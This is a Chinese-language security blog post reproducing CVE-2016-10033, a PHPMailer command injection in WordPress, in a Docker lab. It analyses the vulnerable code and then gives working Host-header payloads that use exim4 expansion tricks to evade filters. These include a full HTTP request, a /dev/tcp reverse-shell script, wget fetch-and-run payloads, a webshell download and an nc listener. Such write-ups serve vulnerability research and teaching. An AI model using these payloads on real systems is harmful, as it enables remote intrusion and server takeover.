@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Whatever is worth doing is worth doing well !">
+    <meta name="author" content="ssooking">
+    
+    <title>
+        
+            WordPress &lt;= 4.6 命令执行漏洞(PHPMailer)复现分析 |
+        
+        ssooking&#39;s notebook
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"ssooking.github.io","root":"/","language":"en","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":false},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.png","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep moving!"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":false},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":3};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                ssooking&#39;s notebook
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                CATEGORIES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                TAGS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">TAGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">WordPress &lt;= 4.6 命令执行漏洞(PHPMailer)复现分析</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.png">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">ssooking</span>
+                        
+                            <span class="author-label">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2018-04-20 19:48:00</span>
+        <span class="mobile">2018-04-20 19:48</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        &gt; <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Web%E5%AE%89%E5%85%A8/">Web安全</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/WordPress/">WordPress</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p>WordPress 是一种使用 PHP 语言开发的博客平台，用户可以在支持 PHP 和 MySQL 数据库的服务器上架设属于自己的网站。也可以把 WordPress 当作一个内容管理系统（CMS）来使用。WordPress 使用 PHPMailer 组件向用户发送邮件。PHPMailer(版本 &lt; 5.2.18)存在远程命令执行漏洞，攻击者只需巧妙地构造出一个恶意邮箱地址，即可写入任意文件，造成远程命令执行的危害。</p>
+<h2 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h2><p>CVE-2016-10033</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>WordPress &lt;&#x3D; 4.7.1    PHPMailer &lt; 5.2.18</p>
+<h1 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h1><ol>
+<li>拉取镜像到本地</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker pull medicean/vulapps:w_wordpress_6</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>启动环境</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -d -p 8000:80 medicean/vulapps:w_wordpress_6 </span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>-p 8000:80</code> 前面的 8000 代表物理机的端口，可随意指定。</p>
+</blockquote>
+<p>访问 <a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1:8000/" >http://127.0.0.1:8000<i class="fas fa-external-link-alt"></i></a> 看到 WordPress 主界面代表启动成功</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>漏洞页面：<code>/wp-login.php?action=lostpassword</code></p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727170958.png"></p>
+<p>此处是管理员重置密码页面，wordpress使用phpmailer组件进行重置密码邮件的发送，但是<code>phpmailer &lt; 5.2.18</code>之前的版本存在命令注入漏洞，具体你可以先阅读分析文章<a class="link"   target="_blank" rel="noopener" href="https://paper.seebug.org/161/" >链接<i class="fas fa-external-link-alt"></i></a> 。</p>
+<p>我们来看看这个漏洞在wordpress中的情况。漏洞文件是<code>class.phpmailer.php</code>，我们在wordpress中搜索查看这个文件，该文件在在<code>wp-includes</code>目录下。我们可以发现几行关键代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Which method to use to send mail.</span></span><br><span class="line"><span class="comment">     * Options: &quot;mail&quot;, &quot;sendmail&quot;, or &quot;smtp&quot;.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Mailer</span> = <span class="string">&#x27;mail&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The path to the sendmail program.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Sendmail</span> = <span class="string">&#x27;/usr/sbin/sendmail&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>我们发现，实际上phpmailer组件是调用linux系统命令<code>sendmail</code>进行邮件发送，命令格式为：<code>sendmail -t -i -fusername@hostname</code>。并且我们继续审计代码发现：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get the server hostname.</span></span><br><span class="line"><span class="comment"> * Returns &#x27;localhost.localdomain&#x27; if unknown.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> protected</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serverHostname</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&#x27;localhost.localdomain&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;Hostname)) &#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;Hostname;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>) <span class="keyword">and</span> <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;SERVER_NAME&#x27;</span>, <span class="variable">$_SERVER</span>) <span class="keyword">and</span> !<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_NAME&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_NAME&#x27;</span>];</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;gethostname&#x27;</span>) &amp;&amp; <span class="title function_ invoke__">gethostname</span>() !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">gethostname</span>();</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">php_uname</span>(<span class="string">&#x27;n&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">php_uname</span>(<span class="string">&#x27;n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>serverHostname</code>函数通过传入的<code>SERVER_NAME</code>参数来获取主机名，该主机名即HTTP请求报文中的host值，但是<code>SERVER_NAME</code>参数并没有经过任何过滤，因此我们可以进行任意构造拼接，从而产生了系统命令注入漏洞。</p>
+<p>更棒的是，<code>sendmail</code> 提供了<code>-O</code>和<code>-X </code>参数，<code>-X</code>参数用于写入日志文件， 我们可以使用<code>-OQueueDirectory=/tmp/ -X/tmp/smtp.php</code>命令组合，它会将发送的邮件保存到<code>/tmp/smtp.php</code>中， 那么在请求的时候payload应该类似于这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /wordpress/wp-login.php?action=lostpassword HTTP/1.1</span><br><span class="line">Host: aaa( -X/tmp/smtp.php )@qq.com</span><br></pre></td></tr></table></figure>
+
+<p>在@前面，如果加上括号，将可以引入空格，这样就可以拼接到了sendmail命令中并且保存了测试邮件文件。那么如果我们写入的是Webshell后门文件呢？</p>
+<p>思路很好，然而现实很无奈。</p>
+<ul>
+<li>wordpress方面以及PHPMailer库方面都会防止攻击者注入空字符（空格或TAB）到sendmail命令中。并且，添加括号引入向sendmail中注入参数的方法已经行不通了，具体可以参考<a class="link"   target="_blank" rel="noopener" href="http://www.securityspace.com/s_survey/data/man.201703/mxsurvey.html" >链接<i class="fas fa-external-link-alt"></i></a>。</li>
+<li>比如我们想要调用<code>/bin/touch</code>的时候也会出问题，因为host字段中如果出现<code>/</code>，服务器会拒绝我们的请求。</li>
+</ul>
+<p>因此上述的Sendmail技术在这种情况下不起作用，这条路走不通了！</p>
+<p>正感觉走投无路的时候，这时候我们不妨喝杯茶冷静一下，为什么sendmail能够产生命令注入漏洞呢？我们去了解一下sendmail。然后就会发现柳暗花明又一村了。我们可以知道<code>ubuntu/debain</code>系统中，已经使用exim4替代了sendmail的功能，我们查看sendmail文件可以发现它是一个链向exim4的软链接文件。</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171004.png"></p>
+<p>那么我们可以利用exim4的语法参数进行命令执行参数的拼接啊！我们查看exim4的帮助手册，可以发现<code>-be</code>参数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Run Exim <span class="keyword">in</span> expansion testing mode. Exim  discards  its  root</span><br><span class="line">                 privilege,  to prevent ordinary <span class="built_in">users</span> from using this mode to</span><br><span class="line">                 <span class="built_in">read</span> otherwise inaccessible files. If no arguments are given,</span><br><span class="line">                 Exim  runs interactively, prompting <span class="keyword">for</span> lines of data. Other‐</span><br><span class="line">                 wise, it processes each argument <span class="keyword">in</span> turn.</span><br><span class="line"></span><br><span class="line">                 If Exim was built with USE_READLINE=<span class="built_in">yes</span> <span class="keyword">in</span> Local/Makefile, it</span><br><span class="line">                 tries  to  load  the libreadline library dynamically whenever</span><br><span class="line">                 the -be option is used without  <span class="built_in">command</span>  line  arguments.  If</span><br><span class="line">                 successful,  it  uses the readline() <span class="keyword">function</span>, <span class="built_in">which</span> provides</span><br><span class="line">                 extensive line-editing facilities, <span class="keyword">for</span> reading the <span class="built_in">test</span> data.</span><br><span class="line">                 A line <span class="built_in">history</span> is supported.</span><br><span class="line"></span><br><span class="line">                 Long expansion expressions can be <span class="built_in">split</span> over several lines by</span><br><span class="line">                 using backslash continuations. As <span class="keyword">in</span> Exim<span class="string">&#x27;s run time configu‐</span></span><br><span class="line"><span class="string">                 ration,  white  space  at  the start of continuation lines is</span></span><br><span class="line"><span class="string">                 ignored. Each argument or data line  is  passed  through  the</span></span><br><span class="line"><span class="string">                 string  expansion  mechanism, and the result is output. Vari‐</span></span><br><span class="line"><span class="string">                 able values from the configuration file (for example,  $qual‐</span></span><br><span class="line"><span class="string">                 ify_domain)  are  available,  but  no message-specific values</span></span><br><span class="line"><span class="string">                 (such as $message_exim_id) are set,  because  no  message  is</span></span><br><span class="line"><span class="string">                 being processed (but see -bem and -Mset).</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                 Note:  If  you  use  this  mechanism to test lookups, and you</span></span><br><span class="line"><span class="string">                 change the data files or databases you are  using,  you  must</span></span><br><span class="line"><span class="string">                 exit  and  restart  Exim before trying the same lookup again.</span></span><br><span class="line"><span class="string">                 Otherwise, because each Exim process caches  the  results  of</span></span><br><span class="line"><span class="string">                 lookups,  you will just get the same result as before.  Macro</span></span><br><span class="line"><span class="string">                 processing is done  on  lines  before  string-expansion:  new</span></span><br><span class="line"><span class="string">                 macros  can  be defined and macros will be expanded.  Because</span></span><br><span class="line"><span class="string">                 macros in the config file are often used for  secrets,  those</span></span><br><span class="line"><span class="string">                 are only available to admin users.</span></span><br></pre></td></tr></table></figure>
+
+<p>简单来说，<code>-be</code>参数是一个字符串拓展测试命令，它可以读取一些变量的数据。比如，<code>$tod_log</code>，它可以显示系统时间。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~$ sendmail -be &#x27;$tod_log&#x27;</span><br><span class="line">2018-04-20 16:26:47</span><br></pre></td></tr></table></figure>
+
+<p>并且，exim4提供了一些函数用来执行一些命令，如字符串截取函数<code>substr</code>、<code>$run</code>系统调用函数。</p>
+<p>我们可以截取空格字符。如图所示，substr函数从第十个字符开始截取，共截取一个字符，也就是时间字符串的第11个字符，是空格字符。</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171008.png"></p>
+<p>那么同理，我们也可以截取<code>/</code>字符串：</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171012.png"></p>
+<p>我们测试使用<code>$run</code>函数调用系统命令</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171016.png"></p>
+<p>到这里，遇到的问题都解决了，我们于是可以构造payload如下，该payload在&#x2F;tmp&#x2F;目录下创建test.txt文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa(any -froot@localhost -be $&#123;run&#123;/bin/touch /tmp/test.txt&#125;&#125; null)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>空格  &#x3D;&#x3D;&gt; ${substr{10}{1}{$tod_log}}</p>
+<p>&#x2F;  &#x3D;&#x3D;&gt; ${substr{0}{1}{$spool_directory}}</p>
+</blockquote>
+<p>转换过来就是</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa(any -froot@localhost -be <span class="variable">$&#123;run&#123;<span class="variable">$&#123;substr&#123;0&#125;</span>&#123;1&#125;</span>&#123;<span class="variable">$spool_directory</span>&#125;&#125;bin<span class="variable">$&#123;substr&#123;0&#125;</span>&#123;1&#125;&#123;<span class="variable">$spool_directory</span>&#125;&#125;<span class="built_in">touch</span><span class="variable">$&#123;substr&#123;10&#125;</span>&#123;1&#125;&#123;<span class="variable">$tod_log</span>&#125;&#125;<span class="variable">$&#123;substr&#123;0&#125;</span>&#123;1&#125;&#123;<span class="variable">$spool_directory</span>&#125;&#125;tmp<span class="variable">$&#123;substr&#123;0&#125;</span>&#123;1&#125;&#123;<span class="variable">$spool_directory</span>&#125;&#125;test.txt&#125;&#125; null)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>我们去密码重置页面输入重置用户名为admin，提交之后拦截请求，并把host的值修改为我们的payload：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wp-login.php?action=lostpassword</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>aa(any -froot@localhost -be $&#123;run&#123;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;bin$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;touch$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;tmp$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;test.txt&#125;&#125; null)</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,en-US;q=0.7,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://172.16.176.128:8000/wp-login.php?action=lostpassword</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>wordpress_test_cookie=WP+Cookie+check</span><br><span class="line"><span class="attribute">DNT</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>63</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql">user_login=<span class="keyword">admin</span>&amp;redirect_to=&amp;wp-submit=<span class="keyword">Get</span>+<span class="built_in">New</span>+<span class="keyword">Password</span></span></span><br></pre></td></tr></table></figure>
+
+<p>提交请求：</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171025.png"></p>
+<p>在&#x2F;tmp目录下发现成功生成了测试文件。</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171030.png"></p>
+<h3 id="执行任意命令"><a href="#执行任意命令" class="headerlink" title="执行任意命令"></a>执行任意命令</h3><p>实际上我们按照刚才的思路，替换我们想要执行的命令即可。但实际利用起来，还是有些需要注意的地方：</p>
+<ul>
+<li>执行的命令不能包含大量特殊字符，如 <code>: </code>、引号等。</li>
+<li>命令会被转换成小写字母</li>
+<li>命令需要使用绝对路径</li>
+<li>需要知道某一个存在的用户的用户名</li>
+</ul>
+<h3 id="写入shell"><a href="#写入shell" class="headerlink" title="写入shell"></a>写入shell</h3><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>思路是利用<code>curl</code>或者<code>wget</code>命令下载远程文件。这里我测试下载执行一个反弹bash脚本。需要注意的地方：</p>
+<ul>
+<li><p>远程 URL 中不能有 <code>http://</code></p>
+</li>
+<li><p>所有字母必须小写</p>
+</li>
+</ul>
+<p>远程反弹shell脚本：<code>172.16.176.1:8080/a.txt</code>，内容：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">nohup</span> bash -i &gt;/dev/tcp/172.16.176.1/1337 0&lt;&amp;1 2&gt;&amp;1) &amp;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>payload：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa(any -froot@localhost -be <span class="variable">$&#123;run&#123;/usr/bin/wget --output-document /tmp/rce 172.16.176.1/a.txt&#125;</span>&#125; null)</span><br></pre></td></tr></table></figure>
+
+<p>执行反弹shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa(any -froot@localhost -be <span class="variable">$&#123;run&#123;/bin/bash /tmp/rce&#125;</span>&#125; null)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>两个payload转换过来就是</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aa(any -froot@localhost -be <span class="variable">$&#123;run&#123;<span class="variable">$&#123;substr&#123;0&#125;</span>&#123;1&#125;</span>&#123;<span class="variable">$spool_directory</span>&#125;&#125;usr<span class="variable">$&#123;substr&#123;0&#125;</span>&#123;1&#125;&#123;<span class="variable">$spool_directory</span>&#125;&#125;bin<span class="variable">$&#123;substr&#123;0&#125;</span>&#123;1&#125;&#123;<span class="variable">$spool_directory</span>&#125;&#125;wget<span class="variable">$&#123;substr&#123;10&#125;</span>&#123;1&#125;&#123;<span class="variable">$tod_log</span>&#125;&#125;--output-document<span class="variable">$&#123;substr&#123;10&#125;</span>&#123;1&#125;&#123;<span class="variable">$tod_log</span>&#125;&#125;<span class="variable">$&#123;substr&#123;0&#125;</span>&#123;1&#125;&#123;<span class="variable">$spool_directory</span>&#125;&#125;tmp<span class="variable">$&#123;substr&#123;0&#125;</span>&#123;1&#125;&#123;<span class="variable">$spool_directory</span>&#125;&#125;rce<span class="variable">$&#123;substr&#123;10&#125;</span>&#123;1&#125;&#123;<span class="variable">$tod_log</span>&#125;&#125;172.16.176.1<span class="variable">$&#123;substr&#123;0&#125;</span>&#123;1&#125;&#123;<span class="variable">$spool_directory</span>&#125;&#125;a.txt&#125;&#125; null)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aa(any -froot@localhost -be <span class="variable">$&#123;run&#123;<span class="variable">$&#123;substr&#123;0&#125;</span>&#123;1&#125;</span>&#123;<span class="variable">$spool_directory</span>&#125;&#125;bin<span class="variable">$&#123;substr&#123;0&#125;</span>&#123;1&#125;&#123;<span class="variable">$spool_directory</span>&#125;&#125;bash<span class="variable">$&#123;substr&#123;10&#125;</span>&#123;1&#125;&#123;<span class="variable">$tod_log</span>&#125;&#125;<span class="variable">$&#123;substr&#123;0&#125;</span>&#123;1&#125;&#123;<span class="variable">$spool_directory</span>&#125;&#125;tmp<span class="variable">$&#123;substr&#123;0&#125;</span>&#123;1&#125;&#123;<span class="variable">$spool_directory</span>&#125;&#125;rce&#125;&#125; null)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在反弹主机上用nc监听1337端口，分别按顺序提交payload即可获取到反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvv -l -p 1337</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171036.png"></p>
+<h4 id="写入一句话webshell"><a href="#写入一句话webshell" class="headerlink" title="写入一句话webshell"></a>写入一句话webshell</h4><p>同理，可以直接下载一句话webshell，然后菜刀连接。payload：</p>
+<p>payload：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa(any -froot@localhost -be <span class="variable">$&#123;run&#123;/usr/bin/wget --output-document a.php 172.16.176.1/a.txt&#125;</span>&#125; null)</span><br></pre></td></tr></table></figure>
+
+<p>转换过来即</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa(any -froot@localhost -be <span class="variable">$&#123;run&#123;<span class="variable">$&#123;substr&#123;0&#125;</span>&#123;1&#125;</span>&#123;<span class="variable">$spool_directory</span>&#125;&#125;usr<span class="variable">$&#123;substr&#123;0&#125;</span>&#123;1&#125;&#123;<span class="variable">$spool_directory</span>&#125;&#125;bin<span class="variable">$&#123;substr&#123;0&#125;</span>&#123;1&#125;&#123;<span class="variable">$spool_directory</span>&#125;&#125;wget<span class="variable">$&#123;substr&#123;10&#125;</span>&#123;1&#125;&#123;<span class="variable">$tod_log</span>&#125;&#125;--output-document<span class="variable">$&#123;substr&#123;10&#125;</span>&#123;1&#125;&#123;<span class="variable">$tod_log</span>&#125;&#125;a.php<span class="variable">$&#123;substr&#123;10&#125;</span>&#123;1&#125;&#123;<span class="variable">$tod_log</span>&#125;&#125;172.16.176.1<span class="variable">$&#123;substr&#123;0&#125;</span>&#123;1&#125;&#123;<span class="variable">$spool_directory</span>&#125;&#125;a.txt&#125;&#125; null)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>自动化提交payload，获取反弹shell。通过<code>python -mSimpleHTTPServer 80 </code>建立web服务，用于目标下载shell。运行是需要用管理员权限，因为监听了80端口。</p>
